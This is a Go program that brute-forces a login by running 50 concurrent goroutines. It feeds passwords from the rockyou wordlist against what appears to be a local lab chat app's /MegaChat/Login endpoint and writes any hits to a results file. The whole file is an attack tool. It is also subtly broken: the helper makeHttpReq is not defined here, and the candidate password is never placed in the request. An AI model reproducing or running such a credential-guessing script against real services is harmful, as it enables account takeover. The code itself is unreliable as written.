package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
)

var (
	goRoutinesNum = 50
	mainUrl       = "http://localhost:3333" // should NOT end with "/"
)

func main() {
	file, err := os.Open("/usr/share/wordlists/rockyou2.txt")
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	defer file.Close()

	bufferedReader := bufio.NewScanner(file)

	totalCount := 0
	done := false
	for done != true {
		fmt.Println(totalCount)
		var wg sync.WaitGroup

		for i := 0; i < goRoutinesNum; i++ {
			canMoreMore := bufferedReader.Scan()
			if !canMoreMore {
				done = true
				break
			}
			line := bufferedReader.Text()

			wg.Add(1)
			go flow(&wg, line, totalCount)
			totalCount += 1
		}

		wg.Wait()
	}

	if err := bufferedReader.Err(); err != nil {
		fmt.Println("Error:", err)
	}

}

func flow(wg *sync.WaitGroup, pass string, count int) {
	defer wg.Done()

	resp := makeHttpReq(
		http.MethodPost,
		mainUrl+"/MegaChat/Login", "",
		true,
	)

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}
	respBody := string(bodyBytes)

	defer resp.Body.Close()

	if count%10000 == 0 {
		fmt.Println(resp.Proto + " " + resp.Status)
		fmt.Println(respBody)
	}

	if !strings.Contains(respBody, "Wrong password") {
		f, err := os.OpenFile("/home/user/res.txt",
			os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			log.Println(err)
		}
		defer f.Close()

		if _, err := f.WriteString("(+)" + pass + "\n"); err != nil {
			log.Println(err)
		}
		if _, err := f.WriteString(respBody + "\n"); err != nil {
			log.Println(err)
		}

		fmt.Println("-----")
		fmt.Println("-----")
		fmt.Println(pass)
		fmt.Println("-----")
		fmt.Println("-----")
	}

	// if resp.StatusCode != http.StatusNotFound {
	// 	fmt.Println("-----")
	// 	fmt.Println("-----")
	// 	fmt.Println(pass)
	// 	fmt.Println(resp.StatusCode)
	// 	fmt.Println("-----")
	// 	fmt.Println("-----")
	// }
}
